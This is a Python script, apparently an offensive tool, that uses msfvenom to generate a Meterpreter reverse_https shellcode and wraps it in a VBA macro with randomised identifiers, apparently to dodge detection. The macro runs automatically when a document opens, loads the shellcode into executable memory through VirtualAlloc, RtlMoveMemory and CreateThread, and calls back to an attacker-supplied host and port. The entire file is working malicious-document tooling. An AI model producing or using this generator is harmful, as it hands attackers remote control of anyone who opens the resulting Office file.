import subprocess
import sys
import re
import random
import string

def random_vba_name(length=3):
    chars = string.ascii_letters
    return random.choice(string.ascii_letters) + ''.join(random.choices(chars + string.digits, k=length))

def generate_vb_shellcode(ip, port):
    print(f"[+] Generating vbapplication shellcode for {ip}:{port}...")
    
    cmd = [
        "msfvenom",
        "-p", "windows/meterpreter/reverse_https",
        f"LHOST={ip}",
        f"LPORT={port}",
        "EXITFUNC=thread",
        "-f", "vbapplication"
    ]
    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    print(f"[msfvenom] {cmd}")

    if result.returncode != 0:
        print("[-] Error generating shellcode:\n", result.stderr)
        sys.exit(1)

    return result.stdout

def extract_array_full(vb_output):
    match = re.search(r'(Array\(.*?\))', vb_output, re.DOTALL)
    if not match:
        print("[-] Failed to extract full Array(...) from msfvenom output.")
        sys.exit(1)
    return match.group(1)

def generate_full_macro(array_line):
    va_VirtualAlloc = random_vba_name()
    va_RtlMoveMemory = random_vba_name()
    va_CreateThread = random_vba_name()
    va_Sleep = random_vba_name()

    fn_main = random_vba_name()
    fn_array = random_vba_name()

    var_shellcode = random_vba_name()
    var_ptr = random_vba_name()
    var_i = random_vba_name()
    var_val = random_vba_name()
    var_wait = random_vba_name()

    return f'''Private Declare PtrSafe Function {va_VirtualAlloc} Lib "kernel32" Alias "VirtualAlloc" (ByVal j3 As Long, ByVal m0 As Long, ByVal x2 As Long, ByVal t8 As Long) As LongPtr
Private Declare PtrSafe Function {va_RtlMoveMemory} Lib "kernel32" Alias "RtlMoveMemory" (ByVal d1 As LongPtr, ByRef z7 As Long, ByVal q9 As Long) As LongPtr
Private Declare PtrSafe Function {va_CreateThread} Lib "kernel32" Alias "CreateThread" (ByVal u1 As Long, ByVal e4 As Long, ByVal g6 As LongPtr, x As Long, ByVal o3 As Long, y As Long) As LongPtr
Private Declare PtrSafe Sub {va_Sleep} Lib "kernel32" Alias "Sleep" (ByVal z As Long)

Function {fn_main}()
    Dim {var_shellcode} As Variant
    Dim {var_ptr} As LongPtr
    Dim {var_i} As Long
    Dim {var_val} As Long
    Dim {var_wait} As Long: {var_wait} = 750

    {va_Sleep} {var_wait}

    {var_shellcode} = {fn_array}()
    {var_ptr} = {va_VirtualAlloc}(0, UBound({var_shellcode}), &H3000, &H40)

    For {var_i} = LBound({var_shellcode}) To UBound({var_shellcode})
        {var_val} = {var_shellcode}({var_i})
        {va_RtlMoveMemory} {var_ptr} + {var_i}, {var_val}, 1
    Next {var_i}

    {va_CreateThread} 0, 0, {var_ptr}, 0, 0, 0
End Function

Function {fn_array}()
    {fn_array} = {array_line}
End Function

Sub AutoOpen()
    {fn_main}
End Sub

Sub Document_Open()
    {fn_main}
End Sub
'''

def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <LHOST> <LPORT>")
        sys.exit(1)

    ip = sys.argv[1]
    port = sys.argv[2]

    vb_output = generate_vb_shellcode(ip, port)
    array_line = extract_array_full(vb_output)
    full_macro = generate_full_macro(array_line)

    with open("vbamacro_out.txt", "w") as f:
        f.write(full_macro)

    print("[+] VBA macro written to vbamacro_out.txt")

if __name__ == "__main__":
    main()
